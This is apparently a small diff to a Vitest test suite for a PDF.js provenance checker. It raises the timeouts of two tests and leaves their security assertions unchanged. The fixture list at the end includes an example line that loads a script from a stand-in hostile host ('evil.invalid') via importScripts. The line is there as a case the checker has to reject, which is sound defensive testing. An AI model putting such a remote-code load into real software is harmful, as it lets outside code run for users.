@@ -39,7 +39,7 @@ afterAll(() => rmSync(temp, { force: true, recursive: true }));
 describe("#369 installed PDF.js provenance and real AST bypass regressions", () => {
   it("accepts the actual local PDF.js assets and locked root dependency", () => {
     expect(inspectPdfEngineProvenance369(isolate()).imports.remoteCount).toBe(0);
-  });
+  }, 20_000); // Real PDF.js copied-code AST audit exceeds Vitest's 5s default on shared Linux CI CPU.
   it("allows relative local worker and URL references and mutable URL reassignment", () => {
     const code = [
       'const local = new URL("./pdf.worker.mjs", import.meta.url);',
@@ -50,7 +50,7 @@ describe("#369 installed PDF.js provenance and real AST bypass regressions", () 
       'new Worker(replaceable);',
     ].join("\n");
     expect(inspectPdfEngineProvenance369(isolate(code)).imports.remoteCount).toBe(0);
-  });
+  }, 20_000); // Timing budget changes only; AST security refusals/assertions are unchanged.
 
   const unsafeSource = [
     ["later importScripts argument", 'importScripts("/local.js", "https://evil.invalid/remote.js");'],
